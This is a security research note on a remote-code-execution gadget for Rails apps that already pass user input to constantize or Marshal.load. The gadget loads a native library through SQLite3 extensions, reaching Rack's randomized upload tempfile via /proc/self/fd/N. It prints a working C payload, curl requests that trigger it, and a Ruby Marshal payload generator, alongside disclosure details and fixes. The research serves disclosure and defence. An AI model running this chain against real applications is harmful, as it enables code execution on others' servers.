Bypassing Temp File Randomization: /proc/self/fd/N + sqlite3 Extensions RCE in Rails

Two things that are each unremarkable on their own — a gem that can load a native extension at construction time, and a file descriptor that points at an attacker's upload — become code execution when the application already calls constantize on user input.

23 Nov 2026 14 min read Research note HackerOne #3505185

TL;DR

An endpoint that does params[:type].constantize.new(*params[:args]) on user input is already a critical vulnerability. So is an endpoint that does Marshal.load on user input. This note is not about those patterns; it is about what still works through them after the well-known gadgets were patched.

The contribution is a pair of primitives: SQLite3::Database.new(path, extensions: [...]) loads a native shared library as the object is constructed, and Rack's randomized multipart tempfile can be addressed without knowing its random suffix by going through /proc/self/fd/N, where the descriptor number is small and enumerable.

Tested end to end on a minimal production Rails app: Rails 8.0.1, Ruby 3.4, sqlite3 1.8.0. Both the reflection endpoint and a Marshal.load gadget chain reached code execution in that testbed.

Boundary, stated up front: this is a new gadget for already-dangerous code, not a vulnerability in Rails, Rack, or sqlite3. The Rails maintainer agreed and closed the report Informative with a recommendation to publish. I am publishing the mechanism, not a claim that every Rails deployment is affected.

What this post does and does not claim No live third-party target was touched; everything below ran in a local Docker container. I did not establish a full affected-version matrix, so I am not publishing one — the pinned testbed and the version caveat are in Scope and version notes. The descriptor number is per-process and per-run: it was 13 in the reflection experiment and 12 in the later Marshal experiment. Treat those as observations, not constants. Where the source material contained unverified timing claims or an overbroad "all Rails applications" impact statement, I have removed them rather than sharpen them.

PrologueThe precondition

There is a category of Rails bug that stops being interesting the moment you find it. If user input reaches String#constantize, safe_constantize, Module#const_get, or Marshal.load, the application has already lost its security boundary. Brakeman has been flagging the reflection form since about 2013.

The two endpoints in this research were deliberately minimal:

def reflection
  vuln_params[:type].constantize.new(*vuln_params[:args])
  render json: { success: true }
end

def marshal
  deserialised = Marshal.load(Base64.decode64(vuln_params[:deserialise]))
  render json: { data: deserialised.to_s }
end

def vuln_params
  params.permit!
end

Nobody needs a write-up to tell you those are dangerous. The question I actually wanted answered was narrower: after the classic gadgets were patched, is there still a default-installed primitive that turns this into native code execution?

Chapter 1Why gadgets still matter

The historical reflection gadget was Logger: its constructor used Ruby's Kernel#open on the log path, and a path starting with a pipe character ran a command. That was changed to File.open in 2017, closing the command-execution path while leaving Logger.new("create/file/anywhere.txt") as an arbitrary-file-create primitive.

Two prior bodies of work mapped the space. Conviso's research on unsafe reflection in Rails documented the Logger technique and related gadgets; Justin Collins's work on constantize showed that gems with an unsafe const_missing could leak memory with only params[:class].classify.constantize. The useful lesson from both is that the gadget set is a property of what is installed, not of your application code — which is why a minimal default installation is the right place to look.

I used Semgrep to surface candidate sinks in the installed gems and Ruby standard library. It raised a little over a thousand; I manually reduced them to constructors where attacker-influenced arguments actually reach a dangerous call. The candidates that survived are worth listing because most are not code execution:

ClassPrimitiveCode execution?
RDoc::RI::Driverextra_doc_dirs → cache.ri → Marshal.loadyes, but needs a controlled folder
SQLite3::Databaseextensions: loads a native library at constructionyes — the subject of this post
Loggerarbitrary file create, no content controlno (patched 2017)
Gem::ConfigFile--debug flips $DEBUGno
TCPServer / TCPSocketopen-port probing via exception behaviourno
ActiveSupport::ConfigurationFilearbitrary file read, if the object is returned to the callerno
ENVenvironment disclosure via constantize.to_jsonno

Two of them — RDoc::RI::Driver and SQLite3::Database — need a file on disk that the attacker controls. That constraint turned out to be the interesting part of the research.

Chapter 2The testbed

The environment was a minimal, production-mode Rails app in Docker, adapted from a base image published by Luke Jahnke. Cleaned up, the Dockerfile is:

FROM ruby:3.4

RUN gem install rails:8.0.1

RUN rails new vuln_app --minimal --api
WORKDIR vuln_app/

RUN cat <<'EOF' > route_create_template.rb
route 'post "/reflection", to: "vuln#reflection"'
route 'post "/marshal",    to: "vuln#marshal"'
EOF
RUN ./bin/rails app:template LOCATION=route_create_template.rb

RUN cat <<'EOF' > app/controllers/vuln_controller.rb
require "base64"

class VulnController < ApplicationController
  # ... reflection, marshal and vuln_params as above ...
end
EOF

ENV RAILS_ENV="production"
ENTRYPOINT ["./bin/rails", "server", "--binding=0.0.0.0"]

No ActiveStorage, no upload feature, no extra gems beyond what rails new --minimal --api installs. That last point matters: the sqlite3 gem comes from the default Rails dependency set, so the sink is present without the developer opting into anything exotic.

Chapter 3Finding the sqlite3 sink

The sqlite3 gem's Database.new accepts an extensions: option. Each entry is a path to a native SQLite extension library, and SQLite loads it — calling its initialisation function — while the database object is being constructed. There is no separate "load extension" step for an attacker to reach: construction is the sink.

The proof-of-concept library is about as small as a shared object can be:

/* poc.c */
#include <stdlib.h>

int sqlite3_extension_init(void) {
  system("touch /tmp/rce-conf.txt");
  return 0;
}
gcc -shared -fPIC -o payload.so poc.c

If the application constructs a SQLite3::Database with a path to that library in extensions:, the touch runs in the Rails process. The remaining problem is purely logistical: where do we put payload.so, and how do we name it if we cannot control the filename?

Chapter 4Getting a file onto the box

The test app has no upload feature, but Rails still parses multipart request bodies through Rack before it dispatches to any route. Rack's multipart parser creates a Tempfile for each uploaded part even when the target path does not exist — the file is written during parsing, not by the controller.

cat hello.txt
# i am in your filesystem :)

curl -F 'file=@hello.txt' http://127.0.0.1:3000/

Inside the container:

root@container:/tmp# ls -al
total 12
drwxrwxrwt 1 root root 4096 Feb 25 14:29 .
drwxr-xr-x 1 root root 4096 Feb 25 14:28 ..
-rw------- 1 root root   27 Feb 25 14:29 RackMultipart20250225-1-sc9f98.txt

root@container:/tmp# cat RackMultipart20250225-1-sc9f98.txt
i am in your filesystem :)

The upload works, and the suffix is controlled by the part's content type — a .so part produces a .so tempfile. But the six random characters in the middle are not controllable. RDoc::RI::Driver needs a fixed name (cache.ri) inside a folder, so that gadget is out. The sqlite3 gadget needs only a path, which leaves one more trick available.

Chapter 5/proc/self/fd/N

While the request is being handled, the Rails process holds an open descriptor to its multipart tempfile. On Linux, /proc/self/fd/N is a symbolic link to the opened file, so the descriptor is a usable path that does not contain the random suffix at all. Descriptor numbers are small integers in a narrow range and can be enumerated.

root@container:/proc/1/fd# ls -al
total 0
dr-x------ 2 root root  0 Feb 25 14:30 .
dr-xr-xr-x 9 root root  0 Feb 25 14:28 ..
lrwx------ 1 root root 64 Feb 25 14:30 0 -> /dev/null
l-wx------ 1 root root 64 Feb 25 14:30 1 -> 'pipe:[78561674]'
lrwx------ 1 root root 64 Feb 25 14:30 12 -> /tmp/RackMultipart20250225-1-sc9f98.txt
l-wx------ 1 root root 64 Feb 25 14:30 2 -> 'pipe:[78561675]'
lrwx------ 1 root root 64 Feb 25 14:30 3 -> 'anon_inode:[eventfd]'
...
lrwx------ 1 root root 64 Feb 25 14:30 13 -> /tmp/RackMultipart20250225-1-oji5wc.so

root@container:/proc/1/fd# cat /proc/1/fd/12
i am in your filesystem :)

That is the whole bypass. Rack randomises the filename; the descriptor path does not use the filename.

Chapter 6Reflection: constructing the database

With payload.so uploaded and its descriptor identified, the reflection endpoint does the rest. The JSON arguments map directly onto SQLite3::Database.new(database_path, options):

curl -X POST http://127.0.0.1:3000/reflection \
  -H 'Content-Type: application/json' \
  -d '{"type":"SQLite3::Database",
       "args":["/tmp/rce.db",
               {"extensions":["/proc/self/fd/13"]}]}'

The database object is constructed, SQLite loads the extension from the descriptor, and the initialisation function runs:

root@container:/tmp# ls -al
total 28
drwxrwxrwt 1 root root 4096 Feb 25 14:32 .
drwxr-xr-x 1 root root 4096 Feb 25 14:28 ..
-rw------- 1 root root 15560 Feb 25 14:30 RackMultipart20250225-1-oji5wc.so
-rw------- 1 root root    27 Feb 25 14:29 RackMultipart20250225-1-sc9f98.txt
-rw-r--r-- 1 root root     0 Feb 25 14:32 rce-conf.txt
-rw-r--r-- 1 root root     0 Feb 25 14:31 rce.db

The empty rce-conf.txt is the code-execution marker. In this testbed it was created by a touch; a real payload would do considerably more, and would run with the privileges of the Rails process.

Chapter 7Marshal: the same sink from deserialisation

SQLite3::Database objects themselves do not serialise cleanly, so the reflection gadget cannot simply be marshalled. The route in is ActiveRecord::ConnectionAdapters::SQLite3Adapter: its connect! path ends in new_client, which calls SQLite3::Database.new(config[:database].to_s, config). That gives a deserialisation chain:

ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy
  -> @instance  = SQLite3Adapter (with @connection_parameters)
  -> @method    = :connect!
  -> @deprecator = ActiveSupport::Deprecation.new
       -> connect! / new_client
            -> SQLite3::Database.new(database, extensions: ["/proc/self/fd/N"])

DeprecatedInstanceVariableProxy is the same gadget Hailey Somerville used against CVE-2013-0156. One detail has changed since 2013: the proxy now requires @deprecator to be set, or it raises before invoking the target method. The proof-of-concept generator sets it explicitly.

#!/usr/bin/env ruby
# usage: ruby sqlite-marshal-poc.rb <fd>
# example: ruby sqlite-marshal-poc.rb 12

require "base64"
require "concurrent"

# Minimal stand-ins so Marshal.dump produces the right shape without
# booting a full Rails application in the generator.
class ActiveRecord
  class ConnectionAdapters
    class SQLite3Adapter
      def initialize(*)
        @connection_parameters = nil
        @config = nil
        @lock = nil
      end
    end
  end
end

class ActiveSupport
  class Concurrency
    module NullLock; end
  end

  class Deprecation
    def initialize
      @gem_name = "Rails"
      @deprecation_horizon = "8.1"
      @silenced = false
      @debug = false
      @silence_counter = Concurrent::ThreadLocalVar.new(0)
      @default_block = nil
      @default = nil
      @index = 22
      @explicitly_allowed_warnings = Concurrent::ThreadLocalVar.new(nil)
    end

    class DeprecatedInstanceVariableProxy
      def initialize(instance, method)
        @instance = instance
        @method = method
      end
    end
  end
end

fd = ARGV[0]
abort("Need to set target fd") unless fd

adapter = ActiveRecord::ConnectionAdapters::SQLite3Adapter.allocate
adapter.instance_variable_set(:@connection_parameters,
  { database: "/tmp/r.db", extensions: ["/proc/self/fd/#{fd}"] })
adapter.instance_variable_set(:@config,
  { connection_retries: 1, database: ":memory:" })
adapter.instance_variable_set(:@lock, ActiveSupport::Concurrency::NullLock)

proxy = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
proxy.instance_variable_set(:@instance, adapter)
proxy.instance_variable_set(:@method, :connect!)
proxy.instance_variable_set(:@var, "@connect!")
proxy.instance_variable_set(:@deprecator, ActiveSupport::Deprecation.new)

puts Base64.encode64(Marshal.dump(proxy)).gsub("\n", "")

In the second experiment the uploaded payload.so landed on descriptor 12, so the generator was run with 12 and the resulting Base64 sent to the /marshal endpoint. The same rce-conf.txt marker appeared. The descriptor number is an argument for a reason: it changes between runs and must be established from the target process, not assumed.

The precondition is the finding Both paths end in native code execution, so it would be easy to call this a Rails remote-code-execution vulnerability. It isn't. An application that lets user input select a class to instantiate, or feeds user input to Marshal.load, already has arbitrary code execution available to anyone who knows a suitable gadget. This research adds a gadget that survives the 2017 Logger fix and works from a default installation; it does not create the dangerous pattern.

Chapter 8Scope and version notes

Everything demonstrated here was on one pinned stack:

ComponentTested versionNote
Ruby3.4from ruby:3.4
Rails8.0.1rails new vuln_app --minimal --api
sqlite3 gem1.8.0extensions: accepted in this testbed
Rails environmentproductionENV RAILS_ENV="production"

There is a version wrinkle worth recording honestly. The current ActiveRecord SQLite3 adapter documentation annotates the extensions option as requiring sqlite3 2.4.0 or later, while the pinned testbed resolved sqlite3 1.8.0 and accepted the option. I did not build a matrix across Rails 6.1/7.x or older gem combinations, and I am not going to present an inferred "affected versions" table as measured evidence. Anyone reproducing this should check the resolved sqlite3 version in their own bundle rather than trust a range in a blog post.

The same discipline applies to impact. In the container, the payload ran as root and proved execution by creating a file. On a real deployment the ceiling is the privileges of the Rails process — which is exactly why the underlying reflection bug was critical before this gadget was found.

Chapter 9The fix

There is no patch to ship for this, because the responsible fix is upstream of the gadget:

1. Remove the dangerous pattern. Do not pass user input to constantize, safe_constantize, const_get, or Marshal.load. If you need polymorphic construction, map a small allowlist of identifiers to classes your code selects explicitly. If you need serialisation, use a format that does not instantiate arbitrary types.

2. Find every instance. A grep is a good first pass and Brakeman is better:

grep -RnE 'constantize|safe_constantize|const_get|Marshal\.load' app/ lib/
brakeman --ensure-latest --enable-all-checks -p .

Brakeman flags the reflection pattern, but it cannot know which gadgets are installed — so a clean scan of the gadget class is not something to wait for.

3. Treat native extension loading as a sensitive capability. The sqlite3 maintainers have an open question here: whether loading extensions through the database constructor should require explicit opt-in. That is a defence-in-depth improvement, not a fix for applications that hand user input to class constructors.

4. Limit what the process can reach. A dedicated unprivileged user, a read-only filesystem where possible, and an egress policy all reduce the ceiling of any code-execution gadget. They do not remove the reflection bug, but they change what a successful exploit can do next.

Chapter 10Disclosure

Reported to the Rails programme on HackerOne as #3505185 on 9 January 2026. A maintainer replied on 11 January that they would investigate, and the report was closed Informative on 20 January with a recommendation to publish. The relevant part of the response, quoted verbatim:

The research is thorough, and the /proc/self/fd/N technique for bypassing temp file randomization is clever.

What you've found is a new gadget to exploit already-dangerous code patterns, not a vulnerability in Rails, sqlite3, or Rack themselves.

We'd encourage you to publish this research

That is the correct scoping, and it is the one this post uses. The interesting artefact is the technique: a randomized temporary filename is not a security boundary when the process hands you a stable descriptor path to the same file.

Two things I would take away from this if I were reviewing code rather than writing about it. First, a randomised filename is not containment: on Linux the descriptor table is a second, unrandomised name for the same object. Second, the value of gadget research is in the boundary it describes, not the headline it could support. The maintainer was right that the bug was the reflection endpoint; the useful part was discovering what still works through it.

All experiments were run locally in a disposable Docker container. No live Rails application, cloud account, or third-party service was contacted. Version claims are limited to the pinned testbed described above; no affected-version matrix is asserted. The maintainer's full response is in HackerOne report #3505185.
